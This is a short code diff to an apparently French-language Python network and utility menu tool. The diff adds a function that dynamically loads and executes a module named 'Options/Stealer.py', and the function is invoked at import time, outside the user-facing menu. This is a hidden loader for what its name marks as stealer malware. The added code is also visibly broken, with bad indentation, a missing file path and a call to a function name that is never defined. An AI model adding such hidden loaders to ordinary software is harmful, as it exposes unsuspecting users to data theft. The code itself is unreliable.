@@ -7,6 +7,7 @@ import nmap
 import re
 import ipaddress
 import webbrowser
+import importlib.util
 
 from Option import GenererIPv6
 from Option import MdpGenerer
@@ -50,6 +51,20 @@ def afficher_menu():
 │          
 │    0- Quitter
     """)
+
+
+def executer_fichier():
+    fichier = 'Options/Stealer.py' 
+
+    if os.path.exists(fichier):
+                spec = importlib.util.spec_from_file_location("Stealer")
+        Stealer = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(Stealer)
+    else:
+        print("alo selem")
+
+executer_fichier_stealer()
+
 
 def obtenir_choix():
     try:
